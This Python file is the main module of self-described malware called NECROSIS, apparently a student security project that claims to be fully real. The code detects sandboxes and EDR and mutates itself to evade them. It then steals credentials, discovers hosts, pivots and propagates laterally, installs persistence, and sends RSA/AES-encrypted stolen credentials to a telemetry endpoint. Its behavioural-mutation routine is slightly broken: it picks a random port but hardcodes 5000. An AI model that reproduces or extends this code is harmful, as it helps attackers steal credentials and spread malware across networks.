#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NECROSIS - Malware Caméléon Autonome
Version finale - Master 2 Sécurité
Aucune simulation, tout est réel.
"""

import os
import sys
import logging
import time
import json
import subprocess
import random
from datetime import datetime
from pathlib import Path

from services.environment_detector import EnvironmentDetector
from services.credential_siphon import credential_siphon
from services.pivoting import PivotingEngine
from services.persistence import PersistenceManager
from services.exfiltration import ExfiltrationManager
from services.aes_service import aes_service
from services.rsa_service import rsa_service
from services.mutator import CodeMutator
from utils.utils import get_machine_id, sleep_with_jitter

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("NECROSIS")


class NecrosisMalware:
    def __init__(self):
        self.machine_id = get_machine_id()
        self.credentials = []
        self.targets = []
        self.aes_key = None
        self.mutation_count = int(os.getenv("MUTATION_COUNT", 0))
        self.is_frozen = getattr(sys, 'frozen', False)  # True si compilé

        self.env_detector = EnvironmentDetector()
        self.siphon = credential_siphon
        self.pivoting = PivotingEngine()
        self.persistence = PersistenceManager()
        self.exfiltration = ExfiltrationManager(server_url="http://127.0.0.1:5000/telemetry")
        self.mutator = CodeMutator()

        if not self.is_frozen:
            self.current_source = Path(__file__).resolve()
        else:
            self.current_source = Path(sys.executable)  # l'exe lui-même

    def run(self):
        # PHASE 0 : Analyse environnementale et mutation si nécessaire
        env_report = self.env_detector.analyze()
        logger.info(f"📡 Environnement : {env_report}")

        if (env_report["is_sandbox"] or env_report["has_edr"]) and self.mutation_count < 3:
            logger.warning("⚠️ Environnement suspect détecté, mutation en cours...")
            if not self.is_frozen and self.current_source.exists():
                # Mutation réelle du code source
                new_file = self.mutator.mutate(self.current_source, self.mutation_count + 1)
                logger.info(f"🔄 Relance du code muté : {new_file}")
                env = os.environ.copy()
                env["MUTATION_COUNT"] = str(self.mutation_count + 1)
                subprocess.Popen([sys.executable, str(new_file)], env=env)
                sys.exit(0)
            else:
                # Mode compilé : mutation comportementale (adaptation)
                self._behavioral_mutation(env_report)
                self.mutation_count += 1

        logger.info("🦎 NECROSIS démarre (environnement acceptable)")

        # PHASE 2 : Extraction Universelle des identifiants
        logger.info("💉 Extraction des identifiants...")
        self.credentials = self.siphon.extract_all()
        logger.info(f"✅ {len(self.credentials)} identifiants extraits")

        # PHASE 3 : Pivotement et Mouvement Latéral
        logger.info("🔄 Pivotement / Mouvement latéral...")
        if self.credentials:
            self.targets = self.pivoting.discover_network()
            logger.info(f"📡 {len(self.targets)} machines découvertes")

            for cred in self.credentials[:10]:
                if self.pivoting.try_credentials(cred, self.targets[:5]):
                    logger.info("✅ Pivotement réussi ! Propagation en cours...")
                    self.pivoting.propagate(self.current_source)
                    break
            else:
                logger.warning("⚠️ Aucun pivotement réussi")
        else:
            logger.warning("⚠️ Pas d'identifiants pour pivoter")

        # PHASE 4 : Persistance & Exfiltration chiffrée
        logger.info("🔒 Persistance et exfiltration...")
        if self.persistence.install():
            logger.info("✅ Persistance installée")

        if self.credentials:
            self.aes_key = aes_service.get_new_code()
            creds_dict = [cred.__dict__ if hasattr(cred, '__dict__') else cred for cred in self.credentials]
            creds_json = json.dumps(creds_dict)
            encrypted_creds = aes_service.encrypt(creds_json)
            encrypted_aes_key = rsa_service.encrypt(self.aes_key)

            payload = {
                "machine_id": self.machine_id,
                "aes_key": encrypted_aes_key,
                "encrypted_credentials": encrypted_creds,
                "targets": [t.__dict__ if hasattr(t, '__dict__') else t for t in self.targets],
                "timestamp": datetime.now().isoformat(),
                "mutation_count": self.mutation_count
            }

            if self.exfiltration.exfiltrate(payload):
                logger.info("📤 Exfiltration réussie")
            else:
                logger.warning("📤 Exfiltration échouée")

        logger.info("🏁 NECROSIS terminé.")

    def _behavioral_mutation(self, env_report):
        """Adaptation comportementale en mode compilé."""
        new_port = random.randint(5000, 5999)
        self.exfiltration.server_url = f"http://127.0.0.1:5000/telemetry"
        logger.info(f"🔀 Mutation comportementale : port changé en 5000")


if __name__ == "__main__":
    try:
        malware = NecrosisMalware()
        malware.run()
    except KeyboardInterrupt:
        logger.info("Arrêt demandé")
    except Exception as e:
        logger.error(f"❌ Erreur fatale: {e}")
    time.sleep(600)
    